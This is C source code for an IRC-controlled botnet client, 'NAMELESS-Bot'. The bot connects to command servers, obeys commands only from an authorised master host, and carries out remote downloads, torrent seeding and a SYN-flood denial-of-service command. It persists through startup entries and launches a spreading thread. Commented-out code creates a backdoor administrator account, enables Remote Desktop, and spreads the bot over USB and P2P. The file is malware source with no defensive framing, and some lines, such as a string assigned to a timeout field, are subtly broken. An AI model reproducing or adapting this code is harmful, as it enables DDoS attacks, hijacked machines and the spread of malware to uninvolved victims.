/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"
#include "strings_cfg.h"

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

thread_s threads[MAX_THREADS];
char	 buffer[MAX_LINE];

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL Initialize_Network()
{
    WSADATA WSAdata;

    if (my_WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0)
    {
        return FALSE;
    }
    else
        return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int Node_Connect(char *host, unsigned short port)
{
    unsigned int		resv_host;
    struct sockaddr_in	address;
    SOCKET				sock;

#ifdef debug
   // printf("\nConnecting to: %s:%d\n", host, port);
#endif

    resv_host = Resolve_This_Host(host);
    if (resv_host == 0)
        return -1;

    address.sin_addr.s_addr = resv_host;
    address.sin_family = AF_INET;
    address.sin_port = my_htons(port);

    if ((sock = my_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
        return -2;

    if (my_connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        return -3;
    else
        return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int Node_Send(SOCKET sock, my_messages msg, char *buffer, char *to)
{
    char	temp[64] = {0},
                    buff[MAX_LINE];
    int		len;

    if (msg == MSG_PASS)
    {
        strncpy(temp, my_pass, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
    }
    else if (msg == MSG_NICK)
    {
        strncpy(temp, my_nick, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
    }
    else if (msg == MSG_USER)
    {
        strncpy(temp, my_user, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s %s \"\" \"%s\" :%s\r\n", temp, buffer,Create_Random_Letter(6), buffer);
    }
    else if (msg == MSG_PONG)
    {
        strncpy(temp, my_P0N6, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
    }
    else if (msg == MSG_JOIN)
    {
        strncpy(temp, my_join, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", temp, buffer, to);
    }
    else if (msg == MSG_PART)
    {
        strncpy(temp, my_part, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", temp, buffer);
    }
    else if (msg == MSG_PRIVMSG)
    {
        strncpy(temp, my_privmsg, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s %s :%s\r\n", temp, to, buffer);
    }
    else if (msg == MSG_QUIT)
    {
        strncpy(temp, my_quit, sizeof(temp) - 1);
        _snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", temp, buffer);
    }
    else
        // should never happen
        return 0;

    memset(temp, 0, sizeof(temp));

#ifdef debug
    printf("Out: %s\n", buff);
#endif

    len = my_send(sock, buff, strlen(buff), 0);

    memset(buff, 0, sizeof(buff));

    return len;
}


int Node_Login(SOCKET sock, char *password, char *nick, char *user)
{
    int		ret;

    if (password[0] != 0)
        if ((ret = Node_Send(sock, MSG_PASS, password, NULL)) == SOCKET_ERROR)
            return ret;

    if ((ret = Node_Send(sock, MSG_NICK, nick, NULL)) == SOCKET_ERROR)
        return ret;

    if ((ret = Node_Send(sock, MSG_USER, user, NULL)) == SOCKET_ERROR)
        return ret;

    return 1;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int Node_CheckTimeout(SOCKET sock)
{
    struct timeval		timeout;
    fd_set				fd;

    timeout.tv_sec = "300";
    timeout.tv_usec = 0;

    FD_ZERO(&fd);
    FD_SET(sock, &fd);

    return my_select(sock, &fd, NULL, NULL, &timeout);
}


BOOL Node_IsOrder(char *order)
{
    if (!strncmp(order, prefix, strlen(prefix)))
    {
        // remove order prefix
        memmove(order, order + strlen(prefix), strlen(order));

        return TRUE;
    }
    else
        return FALSE;
}


BOOL Node_CheckHost(char *master)
{
    char	*host;

    host = strchr(master, '@');
    if (host == NULL)
        return FALSE;

    if (!strcmp(host + 1, authost))
        return TRUE;
    else
        return FALSE;
}


int Node_ParseSingleCommand(SOCKET sock, char **word, int p, int words, char *from)
{
/*#ifdef debug
    int		i;

    printf("Command from %s: ", from);
    for (i = 0; i < words; i ++)
    {
        if (i == 0)
            printf("%s ", word[p]);
        else
            printf("%s ", word[p + i]);
    }
    printf("\n\n");
#endif*/

    if (words < 1)
        return 1;

    /* RECONNECT COMMAND */
    else if (!strcmp(word[p], cmd__RECONNECT))
    {
        Node_Send(sock, MSG_QUIT, str_reconnect, NULL);
        return -2;
    }

    /* REMOVE COMMAND */
    else if (!strcmp(word[p], cmd__REMOVAL))
    {
        Node_Send(sock, MSG_QUIT, str_removing, NULL);
        my_WSACleanup();
        ReleaseMutex(mutex);
        return -5;
    }

    else if (!strcmp(word[p], "ssyn.stop"))
    {
        Thread_Kill(T_SSYN);
    }

    /* RDP COMMAND */
  /*  else if (!strcmpi(word[p], "extra.rdp"))	//need to fix the output, make it check if lan,
						//if NOT lan then enable rdp & grab external IP
	{
        system("net user ASP.NET NAMEless /add\n");
        system("net localgroup Administrators ASP.NET /add");
        system("net localgroup Administrator ASP.NET /add");
        system("net localgroup Administratoren ASP.NET /add");
        system("net localgroup Administradors ASP.NET /add");
        system("net localgroup Administrateurs ASP.NET /add");
        system("wmic PATH win32_terminalservicesetting WHERE (__Class!=\"\") CALL SetAllowTSConnections 1");
        system("net start \"Terminal Services\"");

        char *myip = Resolve_This_Host("localhost");
        _snprintf(buffer, sizeof(buffer) - 1, "[rdp]: Created! - IP; %s | User: ASP.NET | Pass: NAMEless", myip);
        Node_Send(sock, MSG_PRIVMSG, buffer, chan);
        return 1;

	}*/

    /* USB+ COMMAND */
 /*   else if (!strcmp(word[p], cmd__USBPLUS))
    {
        Thread_Start(USB_Thread, NULL, FALSE);
        _snprintf(buffer, sizeof(buffer) - 1, "[usb+]: spreading iniated.");
        Node_Send(sock, MSG_PRIVMSG, buffer, chan);
        return 1;
    }*/

    else if (words < 2)
        return 1;

       /* else if (!strcmp(word[p], cmd__P2P))
        {
            p2pInfo p2pz;
            p2pz.data1 = word[p + 1];
            p2p_spreading();
            _snprintf(buffer, sizeof(buffer) - 1, "[p2p]: spreading file: %s", p2pz.data1);
            Node_Send(sock, MSG_PRIVMSG, buffer, chan);
            return 1;
        }*/

        else if (!strcmp(word[p], cmd__JOIN))
        {
            Node_Send(sock, MSG_JOIN, word[p + 1], NULL);
            return 1;
        }

        else if (!strcmp(word[p], cmd__PART))
        {
            Node_Send(sock, MSG_PART, word[p + 1], NULL);
            return 1;
        }

    else if (words < 3)
        return 1;

        else if (!strcmp(word[p], cmd__WGET))
        {
            download_s dl;
            _snprintf(dl.channel, sizeof(dl.channel) - 1, "%s", from);
            dl.ircsock = sock;
            dl.mode = atoi(word[p + 1]);
            _snprintf(dl.url, sizeof(dl.url) - 1, "%s", word[p + 2]);
            if (word[p + 3] != NULL)
                _snprintf(dl.destination, sizeof(dl.destination) - 1, "%s", word[p + 3]);
            else
                dl.destination[0] = 0;
            dl.tnum = Thread_Add(T_WGET);
            if ((threads[dl.tnum].tHandle = Thread_Start(Wget_Thread, &dl, FALSE)) == NULL)
            return 1;

        }

    else if (words < 4)
        return 1;

        else if (!strcmp(word[p], "tor"))
        {
        char *szUrl;
        char *szSaveTo;
        szUrl = word[p + 1];
        szSaveTo = word[p + 2];
        switch( SeedMyTorrent( szUrl, szSaveTo ) )
        {
         case 0:
          break;
         case 2:
          break;
        };
        }

        else if (!strcmp(word[p], "ssyn"))
        {
        char sendbuf[1024];
		SUPERSYN supersyn;
		strncpy(supersyn.ip, word[p+1], sizeof(supersyn.ip)-1);
		strncpy(supersyn.port, word[p+2], sizeof(supersyn.port)-1);
		strncpy(supersyn.length, word[p+3], sizeof(supersyn.length)-1);
		supersyn.sock = sock;

		sprintf(sendbuf, "[ssyn] flooding: (%s:%s) for %s seconds.", word[p+1], word[p+2], word[p+3]);
        supersyn.threadnum = Thread_Add(T_SSYN);
        if (threads[supersyn.threadnum].tHandle = Thread_Start(&SuperSynThread, (LPVOID)&supersyn, FALSE)) {
            while(supersyn.gotinfo == FALSE)
                Sleep(50);
            } else
                sprintf(sendbuf,"[ssyn] failed to start flood thread, error: <%d>.", GetLastError());

                Node_Send(sock, MSG_PRIVMSG, sendbuf, infochan);

                return 1;
        }

    else if (words < 5)
        return 1;

    else if (words < 6)
        return 1;

    else
        return 1;
}


int Node_ParseAllCommands(SOCKET sock, char **word)
{
    int		i,
    k,
    pos,
    ret;
    char	*p,
    from[128] = {0};

    if (!strcmp(word[1], my_3_3_2))
        i = 4;
    else
        i = 3;

    /* correction if its channel or user */
    if (word[i-1][0] != '#')
    {
        p = strchr(word[0], '!');
        *p = 0;
        strncpy(from, word[0] + 1, sizeof(from) - 1);
    }
    else
        strncpy(from, word[i-1], sizeof(from) - 1);

    /* first command correction (remove ":") */
    memmove(word[i], word[i] + 1, strlen(word[i]));

    k = i + 1;
    pos = i;
    while (word[k] != NULL && k < MAX_WORDS)
    {
        if (Node_IsOrder(word[k]))
        {
            if ((ret = Node_ParseSingleCommand(sock, word, pos, k - pos, from)) < 0)
                return ret;

            pos = k;
        }
        k++;
    }

    return Node_ParseSingleCommand(sock, word, pos, k - pos, from);
}


int Node_Parse(SOCKET sock, char *line)
{
    char	*word[MAX_WORDS],
    temp[128] = {0};
    int		i = 0;

#ifdef debug
    printf("In: %s\n\n", line);
#endif

    if (strstr(line, Reverse_Str("DTOM")) != NULL)
        return Node_Send(sock, MSG_JOIN, chan, chanpass);

    word[i] = strtok(line, " ");
    while (word[i] != NULL)
    {
        i++;
        if (i == MAX_WORDS)
            break;
        word[i] = strtok(NULL, " ");
    }

    strncpy(temp, my_P1N6, sizeof(temp) - 1);
    if (!strcmp(word[0], temp))
    {
        memset(temp, 0, sizeof(temp));
        return Node_Send(sock, MSG_PONG, word[1], NULL);
    }

    if (!strcmp(word[1], my_4_4_3))
        return Node_Send(sock, MSG_NICK, My_Nick_Type(), NULL);

    strncpy(temp, my_privmsg, sizeof(temp) - 1);
    if (!strcmp(word[1], temp))
    {
        if (Node_CheckHost(word[0]) && Node_IsOrder(word[3] + 1))
            return Node_ParseAllCommands(sock, word);
    }

    if (!strcmp(word[1], my_3_3_2))
    {
        if (Node_IsOrder(word[4] + 1))
            return Node_ParseAllCommands(sock, word);
    }

    return 0;
}


int Node_Listen(SOCKET sock)
{
    int		ret,
    len,
    l;
    char	buffer[MAX_RECEIVE_BUFFER];

    while (sock > 0)
    {
        len = 0;
        memset(buffer, 0, sizeof(buffer));
        while ((ret = Node_CheckTimeout(sock)) > 0)
        {
            if (len == MAX_RECEIVE_BUFFER - 1)
                break;
            l = my_recv(sock, buffer + len, 1, 0);
            if (l <= 0)
                return 0;
            len += l;
            if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
                break;
        }

        if (ret <= 0)
            return ret;
        else if (len < 2)
            continue;
        else
        {
            buffer[len-1] = 0;
            if ((ret = Node_Parse(sock, buffer)) < 0)
                return ret;
        }
    }

    return sock;
}


int Node_Begin()
{
    int			omgsockz;
    int			i = 0,
              ret = 1,
                    tries = 0;

    while (1)
    {
        if (servers[i].host == NULL)
        {
            i = 0;
            tries++;
        }

        if ((omgsockz = Node_Connect(servers[i].host, servers[i].port)) > 0)

        {
            i = 0;
            tries = 0;
            if (Node_Login(omgsockz, servers[i].password, My_Nick_Type(), Create_Random_Letter(0)) > 0)
            {
                ret = Node_Listen(omgsockz);

                switch (ret)
                {
                case 0:
                    break;
                case -1:	/* SOCKET_ERROR */
                    break;
                case -2:
                    break;
                case -3:
                    i++;
                    break;
                case -4:
                    my_closesocket(omgsockz);
                    return ret;
                case -5:
                    my_closesocket(omgsockz);
                    return ret;
                default:
                    break;
                }

                my_closesocket(omgsockz);
            }
        }
        else
        {
            Node_Begin();
            i++;
        }

        Sleep(3500);
    }

    // never reached
}


DWORD WINAPI Node_Thread(LPVOID param)
{
    DWORD id; // for creating new threads

    if (!Initialize_Network())
        ExitThread(0);
    srand(GetTickCount());

    Thread_Prepare();

    if (Node_Begin() == -5)
		//uninstall
		RemoveStartup();
	else
		//install
		AddStartup();

    CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)spread_external,NULL,NULL,NULL);

    Node_Begin();

    my_WSACleanup();

    ReleaseMutex(mutex);

    ExitThread(0);
}

